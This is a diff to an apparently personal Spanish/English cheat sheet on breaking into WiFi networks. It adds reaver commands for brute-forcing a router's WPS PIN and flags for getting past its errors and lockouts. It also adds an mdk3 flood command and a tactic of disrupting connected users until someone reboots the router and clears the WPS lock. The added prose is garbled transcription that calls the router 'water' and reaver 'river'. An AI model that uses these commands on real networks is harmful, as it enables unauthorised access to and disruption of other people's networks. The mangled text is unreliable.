@@ -183,10 +183,15 @@ Use the KEY Found whitout the : as a password
 solo funciona si el ruter no tiene protecion PBC push button autentification
 ```
 wash --interface mon0
+reaver --bssid (BSSID) --channel (Nº) -i mon0
 ```
 Lck: muestra si el wps esta bloqueado porque despues de unos intentos se bloquea
 ```
+run riwer whitout associate and associate using airplay-ng
+
 reaver --bssid (BSSID) --channel (Nº) --interface mon0 -vvv --no-associate
+or
+reaver --bssid (BSSID) --channel (Nº) -i mon0 -A -vvv
 ```
 si obtenemos error es que nesecitamos usar una vercion anterior de reaver porque esta no funciona bien
 descargamos la vercion recomendada chmod +x reaver y ./reaver --bssid (BSSID) --channel (Nº) --interface mon0 -vvv --no-associate
@@ -194,6 +199,19 @@ mientras rever intenta brutforce la red coremos el sigiente comando en la termin
 ifconfig
 ```
 aireplay-ng --fakeauth 30(nos asociamos cada 30 segundos) -a (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
+```
+Bypassing 0x3 and 0x4 Errors
+```
+reaver --bssid (BSSID) --channel (Nº) -i mon0 --no-nacks
+```
+WPS Lock  
+Now, the simplest way to get the water to unlock is to just the authenticate all the connected computers
+and keep doing that for a long period of time until the user, one of the users will just think that
+there is something happening in the network and just go in and turn off the router and turn it back on.
+When they do that, the water will get unlocked and then you'll be able to run river again.  
+mdk3 (exploit the router to fors it to reset)  
+```
+mdk3 mon0 a -a (BSSID) -m
 ```
 ## WPA / WPA2 Cracking  
 solo los handshakes tienen informacion util  
